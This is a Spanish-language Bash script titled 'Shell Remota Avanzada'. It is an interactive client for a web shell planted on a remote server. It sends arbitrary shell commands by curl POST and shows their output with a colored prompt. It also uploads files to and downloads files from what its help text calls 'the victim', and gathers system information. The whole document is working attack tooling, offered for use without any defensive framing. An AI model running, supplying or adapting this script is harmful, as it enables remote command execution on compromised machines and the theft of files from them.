#!/bin/bash

echo "====================================="
echo "  Shell Remota Avanzada"
echo "====================================="
echo ""
echo -n "URL del servidor: "
read URL

echo ""
echo "Conectando..."

# Obtener info inicial
response=$(curl -s -X POST "$URL" -d "cmd=pwd;whoami;hostname")
current_pwd=$(echo "$response" | grep -o '"pwd":"[^"]*"' | cut -d'"' -f4)
output=$(echo "$response" | grep -o '"output":"[^"]*"' | sed 's/"output":"//;s/"$//' | sed 's/\\n/\n/g')

if [ -z "$current_pwd" ]; then
    echo "Error: No se pudo conectar al servidor"
    exit 1
fi

# Extraer usuario y hostname
user=$(echo "$output" | sed -n '2p' | tr -d '\r')
host=$(echo "$output" | sed -n '3p' | tr -d '\r')

echo "Conectado como: $user@$host"
echo ""

# Función para subir archivo
upload_file() {
    local file=$1
    if [ ! -f "$file" ]; then
        echo "Error: Archivo '$file' no existe"
        return
    fi
    
    echo "Subiendo $file..."
    base64_data=$(base64 -w 0 "$file")
    remote_path="$current_pwd/$(basename $file)"
    
    response=$(curl -s -X POST "$URL" -d "upload=1&file=$remote_path&data=$base64_data")
    echo "$response"
}

# Función para descargar archivo
download_file() {
    local remote_file=$1
    local local_file=$(basename "$remote_file")
    
    echo "Descargando $remote_file..."
    response=$(curl -s -X POST "$URL" -d "download=1&file=$remote_file")
    
    data=$(echo "$response" | grep -o '"data":"[^"]*"' | sed 's/"data":"//;s/"$//')
    
    if [ -n "$data" ] && [ "$data" != "null" ]; then
        echo "$data" | base64 -d > "$local_file"
        echo "Guardado como: $local_file"
    else
        echo "Error: No se pudo descargar el archivo"
    fi
}

# Mostrar ayuda
show_help() {
    echo ""
    echo "Comandos especiales:"
    echo "  upload <archivo>       - Subir archivo a la víctima"
    echo "  download <archivo>     - Descargar archivo de la víctima"
    echo "  sysinfo                - Información del sistema"
    echo "  help                   - Mostrar esta ayuda"
    echo "  exit                   - Salir"
    echo ""
}

while true; do
    # Prompt colorizado
    echo -ne "\033[1;32m$user@$host\033[0m:\033[1;34m$current_pwd\033[0m$ "
    read -r cmd
    
    # Comandos especiales
    if [ "$cmd" = "exit" ] || [ "$cmd" = "quit" ]; then
        echo "Cerrando conexión..."
        break
    elif [ "$cmd" = "help" ]; then
        show_help
        continue
    elif [[ "$cmd" =~ ^upload[[:space:]](.+)$ ]]; then
        upload_file "${BASH_REMATCH[1]}"
        continue
    elif [[ "$cmd" =~ ^download[[:space:]](.+)$ ]]; then
        download_file "${BASH_REMATCH[1]}"
        continue
    elif [ "$cmd" = "sysinfo" ]; then
        cmd="uname -a && echo '---' && cat /etc/os-release 2>/dev/null || cat /etc/issue && echo '---' && df -h"
    fi
    
    # Comando vacío
    if [ -z "$cmd" ]; then
        continue
    fi
    
    # Enviar comando
    response=$(curl -s -X POST "$URL" -d "cmd=$cmd")
    
    # Extraer salida y nuevo PWD
    output=$(echo "$response" | grep -o '"output":"[^"]*"' | sed 's/"output":"//;s/"$//' | sed 's/\\n/\n/g' | sed 's/\\t/\t/g')
    new_pwd=$(echo "$response" | grep -o '"pwd":"[^"]*"' | cut -d'"' -f4)
    
    if [ -n "$new_pwd" ]; then
        current_pwd="$new_pwd"
    fi
    
    # Mostrar salida
    if [ -n "$output" ] && [ "$output" != "null" ]; then
        echo "$output"
    fi
done